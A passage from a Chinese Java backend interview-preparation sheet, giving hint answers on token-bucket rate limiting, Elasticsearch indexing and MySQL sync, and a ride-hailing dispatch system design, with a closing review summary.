> 你回答...（提示：令牌桶实现 / 令牌桶算法：①以固定速率往桶里放令牌 → 如每秒100个 → 每10ms放1个 ②桶有最大容量 → 如200 → 桶满了丢弃多余的令牌 ③请求来时 → 取1个令牌 → 有就放行(消费令牌)→ 没有就拒绝/等待 / 漏桶 vs 令牌桶：①漏桶 → 请求以任意速率流入 → 以固定速率流出(漏出)→ 超出桶容量的请求丢弃 → 平滑输出 → 不允许突发 ②令牌桶 → 令牌以固定速率生成 → 请求消耗令牌 → 如果桶里有令牌 → 可以突发(一次性消耗多个)→ 允许突发 ③区别 → 漏桶强制匀速输出 → 令牌桶允许短时突发(桶里有积攒的令牌) ④Nginx → 漏桶(limit_req)→ Guava RateLimiter → 令牌桶 / 简化实现（预计算方式，不用后台线程）：
```java
public class TokenBucket {
    private final long capacity;        // 桶容量
    private final long refillRate;      // 每秒生成的令牌数
    private long availableTokens;       // 当前可用令牌数
    private long lastRefillTimestamp;  // 上次补充令牌的时间(纳秒)

    public TokenBucket(long capacity, long refillRate) {
        this.capacity = capacity;
        this.refillRate = refillRate;
        this.availableTokens = capacity;  // 初始满桶
        this.lastRefillTimestamp = System.nanoTime();
    }

    public synchronized boolean tryAcquire() {
        refill();  // 先补充令牌
        if (availableTokens >= 1) {
            availableTokens--;
            return true;   // 有令牌 → 放行
        }
        return false;      // 没令牌 → 拒绝
    }

    private void refill() {
        long now = System.nanoTime();
        long elapsedNanos = now - lastRefillTimestamp;
        // 计算这段时间应该生成的令牌数
        long tokensToAdd = (elapsedNanos * refillRate) / 1_000_000_000L;
        if (tokensToAdd > 0) {
            availableTokens = Math.min(capacity, availableTokens + tokensToAdd);
            lastRefillTimestamp = now;
        }
    }
}
```
/ 核心设计：①不用后台线程不停生成令牌 → 而是懒计算 → 每次取令牌时 → 计算从上次到现在过了多久 → 算出应该生成多少令牌 → 补充 → ②`elapsedNanos * refillRate / 1_000_000_000` → 纳秒差 × 每秒令牌数 / 10亿 = 这段时间应生成的令牌数 ③`Math.min(capacity, ...)` → 不超过桶容量 → 桶满了丢弃 ④`synchronized` → 保证线程安全 → 多线程同时取令牌 → 串行化 / Guava RateLimiter 的实现：①`RateLimiter.create(100)` → 每秒100个令牌 → 底层用 `SmoothBursty` → 和上面的预计算思路一样 → 但更精确 ②`rateLimiter.acquire()` → 取1个令牌 → 如果没有 → 计算需要等多久才有 → `Thread.sleep(等待时间)` → 阻塞等待 → 返回等待的时间 ③`rateLimiter.tryAcquire()` → 非阻塞 → 有就返回true → 没有返回false → 不会等待 ④Guava 内部 → 用 `storedPermits`(已存储令牌) + `nextFreeTicketMicros`(下一个可用时间)→ 精确到微秒 → 比上面的纳秒实现更精确 / 分布式限流：①上面的实现 → 单机 → 只能在当前JVM内限流 ②分布式 → Redis + Lua → 原子操作 → `INCRBY` 计数 + `EXPIRE` 过期 → 或用 Redisson 的 RRateLimiter ③Sentinel → 集群限流 → Token Server 统一分配令牌 → 但有网络开销 / 面试重点：令牌桶=固定速率生成令牌+桶容量+取令牌消耗(允许突发) vs 漏桶=固定速率流出(不允许突发) → 预计算(懒计算不用后台线程): elapsedTime × rate / 纳秒 = 应生成令牌 → Guava RateLimiter = acquire阻塞等待/tryAcquire非阻塞 → 分布式用Redis+Lua或Sentinel Token Server）

**追问2：** 如果要支持突发流量，比如平时100 QPS，但允许短时200 QPS，怎么设计？

> 你回答...（提示：突发流量设计 / 令牌桶天然支持突发：①rate=100 QPS → 每秒生成100个令牌 ②capacity=200 → 桶最大200个令牌 ③空闲时 → 令牌积攒到200 ④突发请求200个 → 一次性消耗200个令牌 → 全部放行 → 突发200 QPS ⑤之后 → 令牌按100/s补充 → 恢复到100 QPS ⑥等2秒 → 桶又满200 → 可以再突发 / 突发量 = 桶容量：①capacity越大 → 允许的突发越大 → 但保护性越差(突发可能压垮下游)②capacity=rate → 不允许突发 → 严格100 QPS ③capacity=2×rate → 允许1秒的2倍突发 ④Guava → `RateLimiter.create(100)` → 默认容量 = 1秒的令牌 → `SmoothBursty` 可以设置预热期 `SmoothWarmingUp` → 预热期间速率从低到高渐变 → 防止冷启动突发 / 冷启动问题：①应用刚启动 → 瞬间大量请求 → 如果直接100 QPS → 可能压垮下游DB(连接池没预热)②解决 → 预热(Warm Up)→ 前10秒 → 10 QPS → 20 → 50 → 100 → 渐进增加 → 给下游预热时间 ③Sentinel → 也有冷启动模式 → `WarmUpController` → 初始QPS低 → 逐步升到阈值 / 面试重点：令牌桶capacity=突发量 → capacity越大突发越大但保护性差 → 冷启动用预热(SmoothWarmingUp/WarmUpController)渐进增加QPS给下游预热）

---

# 二面（30分钟）

## 话题六：Elasticsearch 深入（10分钟）

**面试官：你用过 Elasticsearch 吗？ES 的倒排索引你了解多少？在金融系统里 ES 用来做什么？**

> 你回答...

**追问1：** 先说说 ES 的倒排索引结构。它和 MySQL 的 B+ 树索引有什么本质区别？

> 你回答...（提示：倒排索引 / 正排索引 vs 倒排索引：①正排索引(MySQL B+树)→ 文档ID → 文档内容 → 查询时遍历 → 或用B+树索引定位 → 但全文搜索(如WHERE content LIKE '%银行%')→ 全表扫描 → 慢 ②倒排索引(ES)→ 分词 → 每个"词(Term)" → 对应包含该词的文档ID列表 → 查询"银行" → 直接查倒排索引 → 拿到所有包含"银行"的文档ID → 快 / 倒排索引结构：①Term Dictionary(词典)→ 所有分词后的词 → 如 "银行"/"转账"/"手续费" → 按字典序排列 ②Posting List(倒排表)→ 每个词 → 对应一个文档ID列表 → 如 "银行" → [doc1, doc3, doc7, ...] ③Term Index(词典索引)→ 用FST(Finite State Transducer)压缩存储词典 → 快速定位Term在Dictionary中的位置 → 类似B+树但不全加载到内存 → FST极度压缩 → 1GB词典压缩到几十MB → 放内存 → 查询极快 ④Document → 每个文档有唯一ID → 存原始字段 → 通过ID找到文档内容 / 查询流程：①查询"银行转账" → 分词器 → ["银行", "转账"] ②查倒排索引 → "银行" → [doc1, doc3, doc7] → "转账" → [doc1, doc5, doc7] ③合并(AND/OR)→ AND → [doc1, doc7](两个词都包含)→ OR → [doc1, doc3, doc5, doc7] ④取文档内容 → 从正排索引(doc store)取doc1和doc7的完整内容 ⑤打分(TF-IDF/BM25)→ "银行"在doc1出现3次(doc频率高)→ 在所有文档中出现100次(全局频率低)→ IDF高 → doc1分数高 → 排前面 ⑥返回排序结果 / 和MySQL B+树区别：①MySQL → 精确匹配/范围查询 → `WHERE id = 1` / `WHERE age > 18` → B+树范围查询快(叶子链表)②ES → 全文搜索/模糊匹配 → `WHERE content LIKE '%银行%'` → 分词 → 倒排索引 → 快 ③MySQL → 行级存储 → 一个文档一行 → 适合结构化精确查询 ④ES → 文档级存储 → JSON文档 → 适合非结构化文本搜索 ⑤MySQL → 事务 → ACID → 适合金融核心交易 ⑥ES → 无事务 → 适合搜索/分析 → 不适合做交易主库 / ES 在金融系统的应用：①日志搜索 → 全量交易日志/操作日志/系统日志 → 写入ES → 按关键词/时间/用户搜索 → 比MySQL LIKE快百倍 ②交易流水查询 → 历史交易数据量大(亿级)→ MySQL分库分表查询难 → 同步到ES → 复杂条件搜索 → 快 ③风控数据查询 → 用户画像/交易特征 → 多维查询 → ES聚合分析 ④订单搜索 → 订单状态/金额/时间 → 多条件组合 → ES比MySQL灵活 ⑤注意 → ES不做主库 → 只做搜索/分析 → 数据从MySQL同步 / 面试重点：倒排索引=分词→词典(FST压缩内存)+倒排表(文档ID列表)→ 查询分词后查倒排表合并 → MySQL B+树=精确/范围查询 → ES=全文搜索/模糊匹配 → ES无事务不做主库只做搜索(日志/流水/风控/订单搜索)）

**追问2：** ES 和 MySQL 的数据怎么同步？你用过 Canal 吗？

> 你回答...（提示：ES 数据同步方案 / 方案一：同步双写 ①写MySQL → 写ES → 两个操作在同一个事务(但跨系统事务难)→ 或先写MySQL → 再写ES → ES失败重试 ②问题 → 耦合 → 写ES失败影响MySQL → 或ES成功MySQL失败 → 不一致 → 一般不用 / 方案二：异步双写(MQ) ①写MySQL → 发MQ → 消费者写ES → 异步解耦 → ES写入失败 → MQ重试 → 最终一致 ②问题 → MQ到ES有延迟 → 搜索可能短暂不一致 → 但最终一致 ③适合 → 实时性要求不高的场景 / 方案三：Canal 监听 binlog ①写MySQL → MySQL生成binlog → Canal伪装MySQL从库 → 解析binlog → 转换为ES文档 → 写入ES ②优点 → 业务代码零侵入 → 不用改代码 → Canal自动监听 ③Canal → 连接MySQL → 伪装slave → 接收binlog → 解析 → `Entry` 对象(库/表/操作类型/变更前/变更后数据)→ 发送到MQ/直接写ES ④架构 → MySQL → Canal → MQ(Kafka/RocketMQ)→ Canal Adapter → ES ⑤延迟 → 毫秒级(近实时)⑥问题 → DDL变更(加字段)→ ES mapping要同步更新 → Canal不处理DDL → 需要手动更新ES mapping / 方案四：定时全量/增量同步 ①XXL-JOB → 每天凌晨 → 增量同步 → `WHERE update_time > 上次同步时间` → 从MySQL读 → 批量写ES ②适合 → 数据量大但实时性要求低 → 如每天同步一次 → T+1 / 实际方案组合：①Canal做实时增量同步 → 业务写MySQL → Canal自动同步到ES → 近实时 ②XXL-JOB做全量补偿 → 每天凌晨全量同步一次 → 补偿Canal可能丢失的数据 → 对账 ③ES写入失败 → 告警 → 人工修复 / Mapping 设计：①ES的Mapping → 类似MySQL的表结构 → 定义字段类型 ②`keyword` → 不分词 → 精确匹配 → 如订单号/状态码 → `WHERE order_no = 'xxx'` ③`text` → 分词 → 全文搜索 → 如商品描述/日志内容 → `WHERE content LIKE '%银行%'` ④`date` → 日期 → 范围查询 → `WHERE create_time > '2026-07-01'` ⑤`long/double` → 数值 → 范围/排序 → `WHERE amount > 1000 ORDER BY amount` ⑥`ik_max_word` → 中文分词 → 最细粒度分词 → "中国银行杭州分行" → "中国/国银/银行/杭州/分行" ⑦`ik_smart` → 粗粒度分词 → "中国银行/杭州/分行" → 索引体积小 ⑧动态mapping → 默认ES自动推断类型 → 生产建议关闭(`"dynamic": "strict"`)→ 防止错误数据类型 / 面试重点：Canal=监听MySQL binlog→伪装slave→解析→发MQ→写ES→业务零侵入→近实时 → 配合XXL-JOB全量补偿对账 → Mapping: keyword不分词精确/text分词全文/ik_max_word中文细粒度/dynamic关闭防误类型）

---

## 话题七：核心设计题 - 网约车派单系统（20分钟）

**面试官：最后一个设计题。滴滴的核心——派单系统。用户打车 → 系统匹配附近司机 → 推单给司机 → 司机接单。整个链路你怎么设计？高峰期每秒几十万订单，怎么保证不丢单、快速匹配？**

> 你回答...

**追问1：** 先说说整体架构。从用户点击"叫车"到司机接单，中间经过哪些步骤？

> 你回答...（提示：派单系统架构 / 核心流程：①用户叫车 → App → 发送请求 → 经度/纬度/车型/目的地 ②接入层 → 网关 → 鉴权 → 限流 → 写入订单MQ ③派单引擎 → 消费订单 → 找附近司机 → 过滤 → 排序 → 选司机 → 推单 ④司机端 → 收到推单 → 接受/拒绝 → 超时默认拒绝 ⑤匹配成功 → 通知用户 → 司机前往 → 开始行程 ⑥匹配失败 → 扩大范围/加价/排队 / 架构分层：①接入层 → API Gateway → 鉴权/限流/灰度 → 请求分发 ②订单服务 → 创建订单 → 状态机(待派单→已派单→行程中→已完成→已取消)→ 写DB+Redis ③派单引擎 → 核心组件 → 找司机 → 匹配 → 推单 → 超时处理 ④位置服务 → 司机实时位置 → GPS上报 → 存储 → 查询 ⑤消息服务 → 推送 → 司机App(WebSocket/长连接/厂商推送)⑥风控 → 刷单/异常 / 找附近司机的核心问题：①司机位置在变 → 实时上报 → 每秒几万司机上报位置 ②用户位置 → 查附近 → 在给定经纬度方圆N公里内的司机 ③MySQL做不了 → `WHERE lat BETWEEN x AND y AND lng BETWEEN a AND b` → 范围查询 → 数据量大 → 慢 → 且司机位置频繁变 → 更新频繁 ④方案 → Redis GEO / Redis GEO：①`GEOADD drivers 116.404 39.915 "driver:1001"` → 添加司机位置 ②`GEORADIUS drivers 116.404 39.915 3 KM COUNT 10 ASC` → 查方圆3km内最近的10个司机 ③底层 → GeoHash → 把经纬度编码为字符串 → 前缀相同的离得近 → 用ZSET存(GeoHash→score=经纬度编码)→ 范围查询=ZSET范围查询 ④性能 → 单节点10万QPS → 毫秒级 → 完美适配 / 派单引擎流程：①消费订单 → 提取用户位置+车型 ②Redis GEO → 查附近3km内空闲司机 → 按距离排序 ③过滤 → 状态=空闲 → 车型匹配 → 无当前订单 → 信用分>阈值 → 非黑名单 ④排序 → 距离近优先 → 但不只看距离 → 司机评分/接单率/等待时间(防饿死)⑤选1-3个 → 推单 → 并行推(谁能抢到谁接)或串行推(先推最近的→30秒不接→推下一个)⑥推单 → 长连接 → 司机App收到 → 弹窗 ⑦超时 → 30秒不接 → 推下一个 / 面试重点：派单=用户叫车→网关→订单服务(创建订单)→派单引擎(Redis GEO找附近→过滤→排序→推单→超时轮转)→司机App(长连接接单)→通知用户 → Redis GEO(GeoHash+ZSET)毫秒级查附近司机）

**追问2：** 高峰期每秒几十万订单，Redis GEO 查附近司机会不会成为瓶颈？怎么优化？

> 你回答...（提示：高并发优化 / Redis GEO 的压力：①每个订单 → 一次GEORADIUS → 30万订单/秒 → 30万次GEORADIUS → Redis单节点10万QPS → 打满 ②优化 → 分片/缓存/异步/降级 / 优化方案：①Redis Cluster → GEO数据分片 → 按城市分 → 北京/上海/杭州各一个Redis → 减少单节点压力 → 但单城市高峰也可能打满 ②本地缓存 → 司机位置定期同步到应用内存 → 派单引擎从本地内存查 → 不每次查Redis → 但位置不精确(几秒延迟)③GeoHash网格化 → 把地图分成网格 → 每个网格维护一个司机列表 → 查询时直接取网格 → O(1)→ 不需要GEORADIUS → 但网格边界问题(司机在网格边缘)④异步+批量 → 不是每单都实时查 → 订单进入队列 → 批量处理 → 每批100单 → 一次查Redis → 但延迟增加 / 推单优化：①不是每个订单都推 → 先预匹配 → 把订单和司机在内存中匹配 → 匹配好的才推 → 减少推单次数 ②推单限流 → 每个司机同时最多收到1个推单 → 不打扰 → 但高峰可能排队 ③接单超时 → 高峰缩短到15秒 → 快速轮转 ④扩容 → 派单引擎无状态 → 横向扩容 → 但Redis是瓶颈 / 削峰填谷：①高峰期 → 订单排队 → 不是实时派 → 排队等待 → 等运力空出来 ②加价 → 高峰加价 → 用价格调节供需 → 减少需求 ③拼车 → 多人拼一车 → 提高运力利用率 / 监控告警：①派单延迟 > 10秒 → 告警 → 排查瓶颈 ②匹配率 < 80% → 运力不足 → 调度/加价 ③Redis QPS > 8万 → 接近瓶颈 → 扩容/分片 / 面试重点：Redis GEO瓶颈 → 优化=分片(按城市)/本地缓存(几秒延迟可接受)/GeoHash网格化(O(1))/批量处理 → 推单优化=预匹配+每司机最多1单+高峰缩短超时 → 削峰=排队+加价+拼车）

**追问3：** 司机接单后如果取消怎么办？如果司机到达后用户不出现呢？这些异常流程怎么设计？

> 你回答...（提示：异常流程设计 / 司机取消：①司机接单后取消 → 状态机：已派单→已取消(司机)→ 重新派单 ②重新派单 → 回到派单引擎 → 查附近 → 推下一个 ③防恶意取消 → 司机取消次数统计 → 频繁取消 → 降信用分 → 限制接单 ④补偿 → 司机取消 → 通知用户 → 重新派单 → 用户等待 / 用户取消：①用户取消 → 免费取消(3分钟内)→ 收费取消(3分钟后/司机已出发)②司机已在路上 → 通知司机 → 取消 → 补偿司机(空驶费)③状态机 → 待派单→已取消(用户免费/收费)④防恶意取消 → 用户频繁取消 → 限制叫车 / 司机到达后用户不出现：①司机到达 → 通知用户 → 等待 ②超时 → 5分钟 → 联系用户 → 10分钟 → 判定"爽约"③爽约处理 → 司机可取消 → 收取用户爽约费 → 补偿司机 ④多次爽约 → 封号/限制 / 状态机设计：
```
待派单 ──(派单成功)──→ 已派单 ──(司机接驾)──→ 行程中 ──(到达目的地)──→ 已完成
   │                     │                        │
   │                     │                        │(用户/司机取消)
   │(超时无司机)          │(司机/用户取消)          │
   ↓                     ↓                        ↓
已取消(无匹配)         已取消(派单后)          已取消(行程中)
                       →重新派单              →计算费用/退款
```
①状态机 → 每个状态只能转到特定状态 → 防止非法状态跳转 ②如"已完成"不能回退到"行程中"→ "已取消"不能重新派单(除非新建)③分布式锁 → 防止并发操作 → 司机和用户同时取消 → 只有一个生效 → SETNX / 费用计算：①正常 → 起步价+里程费+时长费+动态加价(高峰) ②司机取消 → 不收费 ③用户取消(3分钟后)→ 收取违约金 ④行程中取消 → 按已行驶距离收费 ⑤费用 → 写入支付系统 → 微信/支付宝/余额 / 面试重点：异常流程=状态机(待派单→已派单→行程中→已完成→已取消)+防非法跳转 → 司机取消重新派单+降信用 → 用户取消免费/收费+补偿司机 → 爽约=超时+爽约费+封号 → 费用=起步价+里程+时长+动态加价+违约金 → 分布式锁防并发取消）

**追问4：** 你做金融系统，如果让你设计一个"司机收入结算"模块，怎么保证资金准确？

> 你回答...（提示：司机结算系统 / 核心流程：①行程结束 → 计算费用 → 生成结算单(应收/应付)②司机收入 = 总费用 - 平台抽成 - 其他扣款(如油费补贴抵扣)③T+1结算 → 每天凌晨 → 汇总当天所有完成的行程 → 生成结算单 → 打款到司机账户 ④对账 → 和行程系统/支付系统/财务系统三方对账 / 资金准确性保证：①事务 → 行程结束 → 更新行程状态 + 生成结算单 → 同一个DB事务 → 原子 ②幂等 → 每个行程 → 只生成一张结算单 → `行程ID` 唯一约束 → 防重复生成 ③精度 → 金额用"分"(int)→ 不用double → BigDecimal计算 ④T+1结算 → 不是实时打款 → 先汇总 → 人工审核 → 打款 → 资金安全 ⑤对账 → 行程系统(行程数/金额)vs 结算系统(结算单数/金额)vs 支付系统(打款数/金额)→ 三方一致 / 结算单状态机：①待生成(行程完成)→ ②已生成(计算完毕)→ ③已审核(财务确认)→ ④已打款(资金到账)→ ⑤已对账(对账完成)⑥异常状态 → 打款失败 → 重试 → 告警 / 异常处理：①打款失败 → 微信/支付宝接口超时 → 查询支付结果 → 确认是否成功 → 不确定 → 挂起 → 人工核实 ②结算金额异常 → 如负数/超大 → 校验 → 拒绝 → 告警 ③跨天行程 → 23:50开始 → 00:10结束 → 算哪天 → 按结束时间算 → T+1 / 面试重点：结算=行程结束→DB事务(更新行程+生成结算单)→幂等(行程ID唯一约束)→金额用分BigDecimal→T+1汇总+人工审核+打款→三方对账(行程vs结算vs支付)→状态机(待生成→已生成→已审核→已打款→已对账)→打款失败查支付结果不确定则挂起人工）

---

## 今日总结

| 模块 | 自评 | 标记 |
|------|------|------|
| Web 安全（SQL注入/#{}vs${}/XSS转义+HttpOnly+CSP/CSRF Token+SameSite/CORS白名单配置） | 能讲清 / 讲不全 / 不会★ | |
| Linux 线上排查（CPU100%→top+jstack+arthas/OOM→jmap+MAT/RT高→分层排查jstat+慢SQL+Redis SLOWLOG） | 能讲清 / 讲不全 / 不会★ | |
| Java 枚举与注解（enum=final class继承Enum/单例防反射+序列化+克隆/注解=接口+@Retention+@Target+反射读取+AOP实战） | 能讲清 / 讲不全 / 不会★ | |
| RocketMQ 高级特性（延迟消息18级别+时间轮/死信队列16次重试后进DLQ/Tag vs SQL92过滤） | 能讲清 / 讲不全 / 不会★ | |
| 手写代码（令牌桶限流器预计算/令牌桶vs漏桶/突发流量capacity/预热WarmUp） | 能讲清 / 讲不全 / 不会★ | |
| Elasticsearch 深入（倒排索引FST+Posting List/MySQL同步Canal binlog/Mapping设计ik分词） | 能讲清 / 讲不全 / 不会★ | |
| 网约车派单系统（Redis GEO找司机/高并发优化分片+本地缓存/异常流程状态机/司机结算DB事务+三方对账） | 能讲清 / 讲不全 / 不会★ | |

### 今日统计
- 不会★：____道 | 讲不全：____道 | 能讲清：____道
- 今天重点补的知识点：_______________
- 明天模拟面试前先复习：_______________

---

> 💡 **今日重点提示**：
> 1. **Web 安全**：SQL 注入 = 字符串拼接+用户输入含SQL关键字 → 防 = 预编译 PreparedStatement（MyBatis `#{}` = `?`占位 / `${}` = 直接拼接有风险 / 表名列名必须用 `${}` 要白名单校验）。XSS = 注入恶意 JS 窃取数据 → 防 = 输出转义 `<>&` + HttpOnly Cookie(JS读不到) + CSP(只加载本域JS)。CSRF = 冒用身份(Cookie自动携带) → 防 = Token + SameSite Cookie + Referer + 二次验证。CORS = 同源策略(协议+域名+端口)放行机制 → 简单请求直接发 / 非简单请求先 OPTIONS 预检 → **`Allow-Origin: *` 不安全 → 白名单指定具体域名**
> 2. **Linux 排查三板斧**：CPU 100% → `top` 定位进程 → `top -Hp` 定位线程 → `printf "%x"` 转十六进制 → `jstack` 看线程栈 → 或 `arthas thread -n 3` 一步到位。OOM → 确保有 `-XX:+HeapDumpOnOutOfMemoryError` → `jmap -dump` 手动dump → 重启恢复 → MAT: Leak Suspects + Dominator Tree + Path to GC Roots。RT 飙高 → 分层排查：APM看调用链 → JVM(jstat看GC/jstack看锁) → DB(慢日志+PROCESSLIST+EXPLAIN) → Redis(SLOWLOG+latency) → 下游服务RT
> 3. **枚举与注解**：enum 编译后 = `final class extends Enum` + 静态常量实例 → 类加载创建(JVM线程安全) → 单例四重免疫(防反射:构造器拒绝 / 防序列化:valueOf返回已有 / 防克隆:抛异常 / 防线程不安全)。注解 = 继承 Annotation 的接口 → `@Retention`(SOURCE编译丢弃/CLASS字节码保留/**RUNTIME反射可读最常用**) + `@Target`(标注位置) + `@Inherited`(子类继承) → Spring `@Component`/`@RequestMapping`/`@Autowired` 都是 RUNTIME + 后处理器扫描 → 自定义注解 + AOP = 日志/权限/幂等零侵入
> 4. **RocketMQ 高级**：延迟消息 = 发到 `SCHEDULE_TOPIC` 按 delayLevel 分队列 → 后台扫描到期重新投递 → 4.x 有 18 个固定级别(1s~2h) / 5.x 任意延迟(时间轮)。死信队列 = 消费失败延迟重试 16 次(10s~2h共4.6h) → 都失败进 `%DLQ%ConsumerGroup` → 隔离不影响正常消费 → 人工处理/控制台重投。Tag 过滤 = 字符串简单匹配快 / SQL92 = 属性条件复杂查询灵活
> 5. **令牌桶限流**：固定速率生成令牌 + 桶容量 + 取令牌消耗（允许突发，桶满时可一次性消耗多个）。漏桶 = 固定速率输出（不允许突发）。预计算实现 = 懒计算不用后台线程 → `elapsedTime × rate / 10^9 = 应生成令牌数` → `Math.min(capacity, available + tokensToAdd)` 不超过桶容量。突发量 = 桶容量（capacity 越大突发越大但保护性差）。冷启动用预热（SmoothWarmingUp/WarmUpController）渐进增加 QPS 给下游预热。分布式限流 = Redis+Lua 或 Sentinel Token Server
> 6. **Elasticsearch 深入**：倒排索引 = 分词 → Term Dictionary（FST 压缩减内存）+ Posting List（文档 ID 列表）→ 查询分词后查倒排表合并 → BM25 打分排序。MySQL B+ 树 = 精确/范围查询 → ES = 全文搜索/模糊匹配。ES 无事务不做主库只做搜索。数据同步 = Canal 监听 binlog → 解析 → 发 MQ → 写 ES → 业务零侵入 + 近实时 → 配合 XXL-JOB 全量补偿对账。Mapping: `keyword` 不分词精确 / `text` 分词全文 / `ik_max_word` 中文细粒度 / `dynamic: strict` 关闭防误类型
> 7. **网约车派单系统**：派单 = 用户叫车 → 网关 → 订单服务(创建订单状态机) → 派单引擎(**Redis GEO** GeoHash+ZSET 毫秒级查附近司机) → 过滤(空闲/车型/信用) → 排序(距离+评分+接单率) → 推单(长连接/超时轮转) → 司机接单 → 通知用户。高并发优化 = 按城市分 Redis 分片 + 本地缓存(几秒延迟可接受) + GeoHash 网格化 O(1) + 批量处理。异常流程 = 状态机(待派单→已派单→行程中→已完成→已取消) + 分布式锁防并发取消。司机结算 = DB 事务(行程+结算单原子) + 幂等(行程ID唯一约束) + 金额用分 BigDecimal + T+1 汇总+人工审核+打款 + 三方对账(行程vs结算vs支付)